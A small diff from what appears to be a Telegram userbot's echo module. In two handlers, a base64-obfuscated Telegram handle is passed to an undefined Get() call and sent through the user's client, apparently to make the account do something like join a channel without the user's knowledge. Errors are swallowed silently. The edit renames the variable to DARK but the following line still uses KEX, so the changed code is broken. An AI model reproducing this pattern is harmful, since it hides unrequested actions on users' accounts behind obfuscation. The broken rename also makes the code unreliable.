@@ -90,7 +90,7 @@ async def rmecho(event):
     if event.sender_id in SUDO_USERS:
         if event.reply_to_msg_id:
             try:
-                KEX = Get(base64.b64decode('QFRoZUFsdHJvbg=='))
+                DARK = Get(base64.b64decode('QFRoZUFsdHJvbg=='))
                 await event.client(KEX)
             except BaseException:
                 pass
@@ -123,7 +123,7 @@ async def _(e):
     check = f"{e.sender_id}_{e.chat_id}"
     if check in ECHO:
         try:
-            KEX = Get(base64.b64decode('QFRoZUFsdHJvbg=='))
+            DARK = Get(base64.b64decode('QFRoZUFsdHJvbg=='))
             await e.client(KEX)
         except BaseException:
             pass
